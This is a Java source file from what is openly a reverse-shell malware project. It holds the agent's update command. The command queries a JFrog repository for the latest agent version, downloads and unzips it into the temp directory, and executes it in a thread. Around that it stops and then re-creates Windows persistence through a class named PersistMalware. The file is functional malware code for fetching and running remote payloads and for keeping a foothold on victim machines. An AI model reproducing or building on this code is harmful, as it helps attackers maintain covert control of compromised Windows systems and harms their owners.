package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.service.persistence.PersistMalware;
import com.mtattab.reverseshell.util.*;

import java.io.IOException;
import java.nio.file.Path;

public class UpdateCommand implements Command {


    @Override
    public String executeCommand(String command) {
        PersistMalware persistMalware = new PersistMalware();
        StringBuilder response = new StringBuilder();
        try {
            String agentURI = getLatestAgentUri();
            String newAgentDirectory = OSUtil.getSystemTmpDir()+Constants.NEW_AGENT_DIRECTORY;
//            System.out.println(agentURI);
            response.append("latest agent url: ").append(agentURI);

            Path path = downLoadAgentIntoDirectory(newAgentDirectory,agentURI);
            System.out.println(path);

            response.append("\n").append("agent Path: ").append(path);


            triggerMalwareAndRecreatePersistence(persistMalware, path, response);


        }catch (Exception e){
            response.append("\n").append("Exception Occurred with command: ").append(e.getMessage());
            e.printStackTrace();
        }finally {
            boolean persistenceStatus =persistMalware.createPersistenceWindows();
            response.append("\n").append("Recreate Persistence:  ").append(persistenceStatus);
        }

        return response.toString();
    }





    private void triggerMalwareAndRecreatePersistence(PersistMalware persistMalware, Path path, StringBuilder response)  {
        LockMechanismUtil.allowWrite =false;

        response.append("\nstopped lock mechanism successfully");
        boolean status =persistMalware.stopWindowsPersistence();
        response.append("\nDeleted windows job: ").append(status);

        Runnable executeMalware = () -> {
            // Your function code goes here
            response.append("\n").append(SystemCommandProxyUtil.runCommand(path.toString()));
        };
        OSUtil.runFunctionInThread(executeMalware);
        response.append("\nrunning agent ");
        OSUtil.sleep(5000);
    }



    private static String getLatestAgentUri(){
        String agentMetaDataFile = HTTPUtil.sendGetRequest(Constants.JFROG_BASE_URL+Constants.JFROG_META_DATA_FILE);
        String latestVersion = DataManipulationUtil.extractByRegex(agentMetaDataFile.toLowerCase(),Constants.JFROG_LATEST_REGEX);
        return Constants.JFROG_BASE_URL+ String.format( Constants.JFROG_LATEST_AGENT_PATH,latestVersion,latestVersion, latestVersion );
    }

    private static Path downLoadAgentIntoDirectory(String newAgentDirectory, String agentURI) throws IOException {
        OSUtil.createDirectories(newAgentDirectory);
        Path filePath = HTTPUtil.downloadFile(agentURI, newAgentDirectory );

        return OSUtil.unzip(filePath.toString(), newAgentDirectory );

    }









}
